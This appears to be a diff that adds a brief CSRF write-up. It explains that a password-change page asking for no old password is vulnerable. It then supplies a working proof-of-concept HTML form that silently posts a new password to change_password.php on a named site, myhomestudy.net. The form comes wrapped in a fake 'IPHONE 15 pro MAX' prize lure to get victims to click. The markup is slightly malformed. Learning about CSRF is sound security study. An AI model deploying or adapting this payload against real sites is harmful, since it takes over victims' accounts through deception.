@@ -1,0 +1,23 @@
+CSRF is an attack that forces a victim to execute unwanted action when they're currently authenticated in a website.
+
+If the action(change_password.php) has CSRF
+e.g. New password _________________
+     Repeat the password __________
+
+It doesn't need old password, so that It must have CSRF.
+
+We create a CSRF form html to make a victim to click. When the victim clicks, victim password is changed.
+
+<center><h1>We have a winnner for an IPHONE 15 pro MAX</center></h1>
+<html>
+  <body>
+      <form method="POST" action="https://myhomestudy.net/change_password.php"
+          <input type="hidden" name="password" value="nightmare"/>
+          <input type="hidden" name="re_password" value="nightmare"/>
+          <input type="hidden" name="submit" value="Save"/>
+          <input type="submit" value="submit">
+      </form>
+  </body>
+</html>
+
+If the login_victim clicks that submit button, victim password will automatically change in myhomestudy.net website.
